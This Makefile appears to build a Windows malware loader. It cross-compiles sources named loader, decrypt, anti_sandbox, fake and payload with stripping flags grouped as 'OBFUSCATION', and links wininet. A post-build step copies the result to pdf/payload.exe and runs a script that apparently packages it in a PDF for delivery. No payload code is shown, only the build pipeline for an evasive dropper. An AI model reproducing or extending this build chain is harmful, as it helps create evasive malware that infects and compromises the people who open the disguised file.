CC = x86_64-w64-mingw32-gcc
CFLAGS = -Ibuild -Wall -Wextra -O1 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing
WARNNIGS = -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes
LIBS = -lmingw32 -lkernel32 -lntdll -luser32 -ladvapi32 -lshell32 -lwininet -lm -lgcc 
OBFUSCATION = -s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident
LDFLAGS = -Wl,--gc-sections,--entry=WinMainCRTStartup,--disable-auto-import,--no-insert-timestamp


SRC = build/loader.c build/definitions.c build/fake.c build/decrypt.c build/winapi.c build/anti_sandbox.c build/payload.c
HEADERS = build/definitions.h
OUTPUT_FILE=$(shell grep -oP '^output_file=\K.*' .conf)


.PHONY: all clean pre-build post-build

all: pre-build $(OUTPUT_FILE) post-build

pre-build:
	@mkdir -p bin build
	@cp src/* build/
	@python3 main.py
	# @rm build/payload.txt

$(OUTPUT_FILE): $(SRC) $(HEADERS)
	$(CC) $(CFLAGS) $(WARNNIGS) $(SRC) -static -static-libgcc -o bin/$@ $(LDFLAGS) $(LIBS) $(OBFUSCATION)

post-build:
	cp bin/$(OUTPUT_FILE) ../../sandbox/
	cp bin/$(OUTPUT_FILE) pdf/payload.exe
	@./pdf/create.sh

clean:
	rm -rf bin build